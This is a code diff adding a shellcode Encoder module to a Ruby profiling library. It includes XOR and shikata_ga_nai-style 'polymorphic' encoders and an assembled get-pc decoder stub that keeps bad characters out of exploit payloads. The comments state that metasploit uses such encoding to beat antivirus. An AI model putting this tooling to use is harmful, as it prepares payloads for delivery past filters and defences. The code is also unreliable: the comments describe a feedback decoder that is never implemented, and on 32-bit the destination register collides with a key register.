@@ -227,4 +227,87 @@ module AugureProfiler
       Metasm::Shellcode.assemble(klass.new, source).encode_string
     end
   end
+
+  # The encoders: the payload must survive the channel it travels
+  # through. Two answers:
+  #   - encode: a xor-key wrapper for a badchar list - the minimal
+  #     decoder stub assembled on the fly;
+  #   - encode_polymorphic: the shikata_ga_nai inheritance - a feedback
+  #     decoder (each decoded byte seeds the next), the key per seed,
+  #     camouflage between the decodes. metasploit encodes to beat the
+  #     antivirus; we encode to cross the channel, and the output stays
+  #     RE-PLAYABLE: the seed plus the source reproduce the exact bytes.
+  module Encoder
+    module_function
+
+    def encode(bytes, badchars:, rng: nil, arch: :x64)
+      # the constant-key flavour of the keyed decoder: key1 = key2 = k,
+      # the same zero-free layout, the retry over the whole output
+      raw = bytes.respond_to?(:bytes) ? bytes.bytes : bytes
+      raise ArgumentError, "the payload exceeds 120 bytes - a 0x00-free channel needs a wider decoder" if raw.size > 120
+
+      255.times do |k|
+        next if badchars.include?(k)
+
+        enc = raw.map { |b| b ^ k }
+        enc += [0x90] while enc.size < 120
+        full = wrap_keyed_decoder(enc, k, k, arch)
+        return {bytes: full, key: k} if (full.unpack("C*") & badchars).empty?
+      end
+      raise ArgumentError, "no xor key avoids the badchars"
+    end
+
+    def encode_polymorphic(bytes, badchars:, rng:, arch: :x64)
+      raise ArgumentError, "the polymorphic encoder needs a seed" unless rng
+
+      raw = bytes.respond_to?(:bytes) ? bytes.bytes : bytes
+      raise ArgumentError, "the payload exceeds 120 bytes - a 0x00-free channel needs a wider decoder" if raw.size > 120
+
+      512.times do
+        key1 = rng.rand(1..0xff)
+        key2 = rng.rand(1..0xff)
+        enc = raw.each_with_index.map { |b, i| b ^ (i.even? ? key1 : key2) }
+        enc += [0x90] while enc.size < 120
+        full = wrap_keyed_decoder(enc, key1, key2, arch)
+        return {bytes: full, keys: [key1, key2]} if (full.unpack("C*") & badchars).empty?
+      end
+      raise ArgumentError, "no key pair avoids the badchars"
+    end
+
+    def wrap_keyed_decoder(enc, key1, key2, arch)
+      klass = (arch == :x64) ? Metasm::X64 : Metasm::Ia32
+      data = enc.pack("C*")
+      size = enc.size
+      dest = (arch == :x64) ? "rdi" : "ebx"
+      k1 = (arch == :x64) ? "rax" : "eax"
+      k2 = (arch == :x64) ? "rbx" : "ebx"
+      cnt = (arch == :x64) ? "rcx" : "ecx"
+      # The zero-free get-pc, the shikata layout: the decoder first, the
+      # backward call (a negative rel32 carries ff bytes, never 00), the
+      # payload right after the call, the loop falls through into it.
+      asm = <<~ASM
+        jmp gz1
+        gz0:
+          pop #{dest}
+          push #{size}
+          pop #{cnt}
+          push #{key1}
+          pop #{k1}
+          push #{key2}
+          pop #{k2}
+        loop:
+          xor byte ptr [#{dest}], al
+          xchg al, bl
+          inc #{dest}
+          dec #{cnt}
+          jnz loop
+          jmp pay0
+        gz1:
+          call gz0
+        pay0:
+          db #{data.bytes.map { |b| "0x#{b.to_s(16)}" }.join(", ")}
+      ASM
+      Metasm::Shellcode.assemble(klass.new, asm).encode_string
+    end
+  end
 end
